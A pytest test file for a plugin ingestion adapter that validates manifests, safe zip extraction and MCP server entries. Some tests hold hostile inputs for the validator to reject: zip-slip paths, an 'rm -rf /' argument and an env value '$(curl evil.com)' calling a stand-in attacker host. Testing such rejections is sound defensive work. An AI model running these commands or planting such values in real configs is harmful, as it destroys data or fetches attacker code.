"""Tests for the Agent Plugins 1.0 ingestion adapter (agent_plugins.py)."""

from __future__ import annotations

import json
import zipfile
from pathlib import Path

import pytest

from hecate.core.plugin.agent_plugins import (
    AgentPluginValidationError,
    ComponentInventory,
    DiscoveredSkill,
    McpServerSpec,
    check_size_caps,
    check_stdio_entry,
    compute_tree_digest,
    detect_package_kind,
    discover_skills,
    materialize_from_dir,
    materialize_from_git,
    materialize_from_zip,
    parse_skill_candidate,
    resolve_contained,
    validate_mcp_json,
    validate_plugin_json,
)


def _minimal_manifest() -> dict:
    return {
        "$schema": "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json",
        "name": "docs-helper",
    }


class TestValidatePluginJson:
    """Closed-manifest validation (task 2.1)."""

    def test_valid_manifest_accepted(self) -> None:
        result = validate_plugin_json(
            {
                **_minimal_manifest(),
                "version": "1.2.3",
                "description": "A helper",
                "author": {"name": "org", "email": "o@x.com", "url": "https://x.com"},
                "keywords": ["docs"],
                "extensions": {"com.example": {"k": 1}},
            }
        )
        assert result.schema_version == "1.0.0"
        assert result.warnings == []
        assert result.manifest["name"] == "docs-helper"

    def test_unknown_top_level_field_warns(self) -> None:
        result = validate_plugin_json({**_minimal_manifest(), "x-custom": 1})
        assert any("x-custom" in w for w in result.warnings)
        assert result.manifest["name"] == "docs-helper"

    def test_unrecognized_schema_rejected(self) -> None:
        with pytest.raises(AgentPluginValidationError, match="Unrecognized"):
            validate_plugin_json({**_minimal_manifest(), "$schema": "https://x/9.9.9"})

    def test_missing_schema_rejected(self) -> None:
        with pytest.raises(AgentPluginValidationError, match="Unrecognized"):
            validate_plugin_json({"name": "docs-helper"})

    def test_invalid_name_grammar_rejected(self) -> None:
        for bad in ("Docs", "a--b", "a..b", "-abc", "abc-", "", "a" * 65):
            with pytest.raises(AgentPluginValidationError, match="Invalid plugin name"):
                validate_plugin_json({**_minimal_manifest(), "name": bad})

    def test_author_extra_fields_rejected(self) -> None:
        with pytest.raises(AgentPluginValidationError, match="closed model"):
            validate_plugin_json({**_minimal_manifest(), "author": {"name": "x", "phone": "1"}})

    def test_non_object_extensions_warns_not_fatal(self) -> None:
        result = validate_plugin_json({**_minimal_manifest(), "extensions": "oops"})
        assert any("extensions" in w for w in result.warnings)

    def test_keywords_wrong_type_rejected(self) -> None:
        with pytest.raises(AgentPluginValidationError, match="keywords"):
            validate_plugin_json({**_minimal_manifest(), "keywords": "docs"})

    def test_non_object_rejected(self) -> None:
        with pytest.raises(AgentPluginValidationError, match="JSON object"):
            validate_plugin_json([1, 2])


class TestPathContainment:
    """Symlink-escape rejection (task 2.3)."""

    def test_resolve_inside_root(self, tmp_path: Path) -> None:
        target = resolve_contained(tmp_path, "skills/a/SKILL.md")
        assert target == (tmp_path / "skills/a/SKILL.md").resolve()

    def test_symlink_escape_rejected(self, tmp_path: Path) -> None:
        package = tmp_path / "pkg"
        outside_dir = tmp_path / "outside"
        outside_dir.mkdir()
        outside = outside_dir / "secret.txt"
        outside.write_text("secret")
        link_dir = package / "skills" / "a"
        link_dir.mkdir(parents=True)
        (link_dir / "SKILL.md").symlink_to(outside)
        with pytest.raises(AgentPluginValidationError, match="escapes package root"):
            resolve_contained(package, "skills/a/SKILL.md")

    def test_symlink_inside_root_allowed(self, tmp_path: Path) -> None:
        package = tmp_path / "pkg"
        (package / "skills" / "a").mkdir(parents=True)
        (package / "shared.md").write_text("ok")
        (package / "skills" / "a" / "SKILL.md").symlink_to(package / "shared.md")
        resolved = resolve_contained(package, "skills/a/SKILL.md")
        assert resolved.name == "shared.md"


class TestMaterialization:
    """Source materialization (task 2.2)."""

    def _make_package(self, root: Path) -> None:
        (root / "skills" / "deploy").mkdir(parents=True)
        (root / "plugin.json").write_text(json.dumps(_minimal_manifest()))
        (root / "skills" / "deploy" / "SKILL.md").write_text(
            "---\nname: deploy\ndescription: deploys things\n---\nRun the deploy."
        )

    def test_dir_materialization_is_snapshot(self, tmp_path: Path) -> None:
        src = tmp_path / "src"
        self._make_package(src)
        dest = tmp_path / "dest"
        origin = materialize_from_dir(src, dest)
        assert origin.type == "dir"
        assert (dest / "plugin.json").is_file()
        # Editing the source afterwards does not affect the snapshot
        (src / "plugin.json").write_text("{}")
        assert json.loads((dest / "plugin.json").read_text())["name"] == "docs-helper"

    def test_dir_missing_source_rejected(self, tmp_path: Path) -> None:
        with pytest.raises(AgentPluginValidationError, match="not found"):
            materialize_from_dir(tmp_path / "missing", tmp_path / "dest")

    def test_zip_safe_extract(self, tmp_path: Path) -> None:
        zip_path = tmp_path / "pkg.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("plugin.json", json.dumps(_minimal_manifest()))
            zf.writestr("skills/deploy/SKILL.md", "---\nname: deploy\ndescription: d\n---\nbody")
        dest = tmp_path / "dest"
        origin = materialize_from_zip(zip_path, dest)
        assert origin.type == "zip"
        assert (dest / "skills" / "deploy" / "SKILL.md").is_file()

    def test_zip_slip_rejected(self, tmp_path: Path) -> None:
        zip_path = tmp_path / "evil.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("../evil.txt", "x")
        with pytest.raises(AgentPluginValidationError, match="Unsafe zip entry"):
            materialize_from_zip(zip_path, tmp_path / "dest")

    def test_zip_absolute_entry_rejected(self, tmp_path: Path) -> None:
        zip_path = tmp_path / "evil2.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("/etc/evil.txt", "x")
        with pytest.raises(AgentPluginValidationError, match="Unsafe zip entry"):
            materialize_from_zip(zip_path, tmp_path / "dest")

    def test_zip_corrupted_rejected(self, tmp_path: Path) -> None:
        bad = tmp_path / "bad.zip"
        bad.write_bytes(b"not a zip")
        with pytest.raises(AgentPluginValidationError, match="Corrupted zip"):
            materialize_from_zip(bad, tmp_path / "dest")

    def test_git_clone_records_pin_triple(self, tmp_path: Path) -> None:
        import os
        import subprocess

        # Strip leaked GIT_* env (e.g. when pytest itself runs inside a git
        # hook: absolute GIT_DIR/GIT_INDEX_FILE would redirect these fixture
        # git operations into the outer repository's index and hooks).
        env = {k: v for k, v in os.environ.items() if not k.startswith(("GIT_", "PRE_COMMIT"))}
        repo = tmp_path / "repo"
        repo.mkdir()
        self._make_package(repo)
        subprocess.run(["git", "init", "-q"], cwd=repo, check=True, env=env)  # noqa: S603
        subprocess.run(["git", "add", "-A"], cwd=repo, check=True, env=env)  # noqa: S603
        subprocess.run(  # noqa: S603
            ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "x"],
            cwd=repo,
            check=True,
            env=env,
        )
        dest = tmp_path / "dest"
        origin = materialize_from_git(f"file://{repo}", dest)
        assert origin.type == "git"
        assert origin.commit_sha is not None and len(origin.commit_sha) == 40
        assert origin.content_digest.startswith("sha256:")
        assert (dest / "plugin.json").is_file()

    def test_git_clone_failure_raises(self, tmp_path: Path) -> None:
        with pytest.raises(AgentPluginValidationError, match="git clone failed"):
            materialize_from_git("file:///nonexistent/repo-xyz", tmp_path / "dest")


class TestDigestAndSizeCaps:
    """Tree digest and size caps (task 2.4)."""

    def test_digest_stable_and_content_sensitive(self, tmp_path: Path) -> None:
        (tmp_path / "a.txt").write_text("hello")
        d1 = compute_tree_digest(tmp_path)
        assert d1 == compute_tree_digest(tmp_path)
        (tmp_path / "a.txt").write_text("world")
        assert d1 != compute_tree_digest(tmp_path)

    def test_oversized_package_rejected(self, tmp_path: Path) -> None:
        (tmp_path / "big.bin").write_bytes(b"x" * 100)
        with pytest.raises(AgentPluginValidationError, match="per-package cap"):
            check_size_caps(tmp_path, max_package_bytes=50)

    def test_workspace_aggregate_rejected(self, tmp_path: Path) -> None:
        (tmp_path / "a.bin").write_bytes(b"x" * 60)
        with pytest.raises(AgentPluginValidationError, match="per-workspace cap"):
            check_size_caps(
                tmp_path,
                max_package_bytes=100,
                workspace_usage_bytes=50,
                max_workspace_bytes=100,
            )


class TestPackageKindDetection:
    """Bare SKILL.md directory acceptance (task 2.5)."""

    def test_standard_package(self, tmp_path: Path) -> None:
        (tmp_path / "plugin.json").write_text("{}")
        assert detect_package_kind(tmp_path) == "agent-plugin"

    def test_bare_skills_dir_is_virtual(self, tmp_path: Path) -> None:
        (tmp_path / "skills" / "deploy").mkdir(parents=True)
        (tmp_path / "skills" / "deploy" / "SKILL.md").write_text("x")
        assert detect_package_kind(tmp_path) == "virtual"

    def test_bare_root_level_skills_is_virtual(self, tmp_path: Path) -> None:
        # Claude Code compatibility: skill dirs directly at root without plugin.json
        (tmp_path / "deploy").mkdir()
        (tmp_path / "deploy" / "SKILL.md").write_text("x")
        assert detect_package_kind(tmp_path) == "virtual"

    def test_nothing_recognizable_rejected(self, tmp_path: Path) -> None:
        (tmp_path / "README.md").write_text("x")
        with pytest.raises(AgentPluginValidationError):
            detect_package_kind(tmp_path)


class TestSkillDiscovery:
    """Fixed-location discovery (task 3.1) and import mapping (task 3.2)."""

    def test_discovery_immediate_children_only(self, tmp_path: Path) -> None:
        (tmp_path / "skills" / "a").mkdir(parents=True)
        (tmp_path / "skills" / "a" / "SKILL.md").write_text("x")
        (tmp_path / "skills" / "a" / "nested").mkdir()
        (tmp_path / "skills" / "a" / "nested" / "SKILL.md").write_text("y")
        found = discover_skills(tmp_path)
        assert [s.dir_name for s in found] == ["a"]

    def test_discovery_empty_when_no_skills_dir(self, tmp_path: Path) -> None:
        assert discover_skills(tmp_path) == []

    def test_parse_candidate_maps_fields(self, tmp_path: Path) -> None:
        skill_md = tmp_path / "SKILL.md"
        skill_md.write_text(
            "---\n"
            "name: deploy\n"
            "description: Deploys things\n"
            "license: MIT\n"
            'compatibility: ">=1.0"\n'
            "allowed-tools: [bash, http]\n"
            "metadata:\n"
            "  owner: platform\n"
            "---\n"
            "Run the deploy now."
        )
        candidate = parse_skill_candidate(DiscoveredSkill(dir_name="deploy", skill_md=skill_md))
        assert candidate.name == "deploy"
        assert candidate.description == "Deploys things"
        assert candidate.instructions == "Run the deploy now."
        assert candidate.extra["license"] == "MIT"
        assert candidate.extra["allowed-tools"] == ["bash", "http"]
        assert candidate.extra["metadata"] == {"owner": "platform"}

    def test_parse_candidate_name_mismatch_raises(self, tmp_path: Path) -> None:
        skill_md = tmp_path / "SKILL.md"
        skill_md.write_text("---\nname: ship-it\ndescription: d\n---\nbody")
        from hecate.core.plugin.agent_plugins import DiscoveredSkill

        with pytest.raises(ValueError, match="does not match directory name"):
            parse_skill_candidate(DiscoveredSkill(dir_name="deploy", skill_md=skill_md))

    def test_parse_candidate_invalid_frontmatter_raises(self, tmp_path: Path) -> None:
        from hecate.core.plugin.agent_plugins import DiscoveredSkill

        skill_md = tmp_path / "SKILL.md"
        skill_md.write_text("no frontmatter at all")
        with pytest.raises(ValueError):
            parse_skill_candidate(DiscoveredSkill(dir_name="deploy", skill_md=skill_md))


class TestMcpJsonValidation:
    """mcp.json parsing and translation (task 3.3)."""

    def test_http_entry_translated(self) -> None:
        outcome = validate_mcp_json(
            {
                "mcpServers": {
                    "search": {
                        "type": "streamable-http",
                        "url": "https://api.example.com/mcp",
                    }
                }
            },
            "1.0.0",
        )
        assert outcome.disabled_reason is None
        assert len(outcome.servers) == 1
        assert outcome.servers[0].transport == "http"
        assert outcome.servers[0].endpoint == "https://api.example.com/mcp"

    def test_sse_maps_to_http(self) -> None:
        outcome = validate_mcp_json(
            {"mcpServers": {"s": {"type": "sse", "url": "https://x.com/mcp"}}},
            "1.0.0",
        )
        assert outcome.servers[0].transport == "http"

    def test_loopback_http_allowed(self) -> None:
        outcome = validate_mcp_json(
            {"mcpServers": {"l": {"type": "streamable-http", "url": "http://127.0.0.1:8080/mcp"}}},
            "1.0.0",
        )
        assert outcome.servers[0].endpoint == "http://127.0.0.1:8080/mcp"

    def test_non_loopback_plaintext_rejected(self) -> None:
        outcome = validate_mcp_json(
            {"mcpServers": {"s": {"type": "streamable-http", "url": "http://api.example.com/mcp"}}},
            "1.0.0",
        )
        assert outcome.servers == []
        assert any("HTTPS required" in w for w in outcome.warnings)

    def test_header_credentials_rejected(self) -> None:
        outcome = validate_mcp_json(
            {
                "mcpServers": {
                    "s": {
                        "type": "streamable-http",
                        "url": "https://x.com/mcp",
                        "headers": {"Authorization": "Bearer sk-abc123"},
                    }
                }
            },
            "1.0.0",
        )
        assert outcome.servers == []
        assert any("credentials" in w for w in outcome.warnings)

    def test_cross_variant_fields_skip_entry(self) -> None:
        outcome = validate_mcp_json(
            {
                "mcpServers": {
                    "s": {
                        "type": "stdio",
                        "command": "npx",
                        "url": "https://x.com",
                    }
                }
            },
            "1.0.0",
        )
        assert outcome.servers == []
        assert any("cross-variant" in w for w in outcome.warnings)

    def test_stdio_entry_translated(self) -> None:
        outcome = validate_mcp_json(
            {
                "mcpServers": {
                    "s": {
                        "type": "stdio",
                        "command": "npx",
                        "args": ["-y", "some-server"],
                        "cwd": "${PLUGIN_ROOT}",
                    }
                }
            },
            "1.0.0",
        )
        assert outcome.servers[0].transport == "stdio"
        assert outcome.servers[0].endpoint == "npx"

    def test_stdio_bad_command_token_rejected(self) -> None:
        outcome = validate_mcp_json(
            {"mcpServers": {"s": {"type": "stdio", "command": "/usr/bin/env"}}},
            "1.0.0",
        )
        assert outcome.servers == []

    def test_schema_mismatch_disables_mcp_only(self) -> None:
        outcome = validate_mcp_json(
            {"$schema": "https://x/2.0.0/plugin.schema.json", "mcpServers": {}},
            "1.0.0",
        )
        assert outcome.disabled_reason is not None
        assert "does not match" in outcome.disabled_reason

    def test_unknown_top_level_warns(self) -> None:
        outcome = validate_mcp_json({"mcpServers": {}, "extra": 1}, "1.0.0")
        assert any("extra" in w for w in outcome.warnings)


class TestStdioTrustGating:
    """Command-allowlist gating (task 6.1 helpers)."""

    def test_allowed_command(self) -> None:
        spec = McpServerSpec(server_name="s", transport="stdio", endpoint="npx", args=["-y", "server"])
        assert check_stdio_entry(spec, ["npx", "uvx"]) is None

    def test_command_outside_allowlist(self) -> None:
        spec = McpServerSpec(server_name="s", transport="stdio", endpoint="bash")
        reason = check_stdio_entry(spec, ["npx", "uvx"])
        assert reason is not None and "not in allowlist" in reason

    def test_empty_allowlist_fail_closed(self) -> None:
        spec = McpServerSpec(server_name="s", transport="stdio", endpoint="npx")
        reason = check_stdio_entry(spec, [])
        assert reason is not None and "fail-closed" in reason

    def test_dangerous_arg_denied(self) -> None:
        spec = McpServerSpec(
            server_name="s",
            transport="stdio",
            endpoint="npx",
            args=["-y", "server", "-c", "rm -rf /"],
        )
        reason = check_stdio_entry(spec, ["npx"])
        assert reason is not None and "arbitrary code" in reason

    def test_dangerous_env_denied(self) -> None:
        spec = McpServerSpec(
            server_name="s",
            transport="stdio",
            endpoint="npx",
            env={"HOOK": "$(curl evil.com)"},
        )
        reason = check_stdio_entry(spec, ["npx"])
        assert reason is not None and "arbitrary code" in reason


class TestComponentInventory:
    """Inventory record shape (task 5.4)."""

    def test_entries_recorded_with_reasons(self) -> None:
        inv = ComponentInventory()
        inv.add_skill("deploy", "imported")
        inv.add_skill("bad", "skipped", reason="name mismatch")
        inv.add_mcp_server("search", "registered")
        assert inv.skills[0] == {"name": "deploy", "status": "imported"}
        assert inv.skills[1]["reason"] == "name mismatch"
        assert inv.mcp_servers[0]["status"] == "registered"
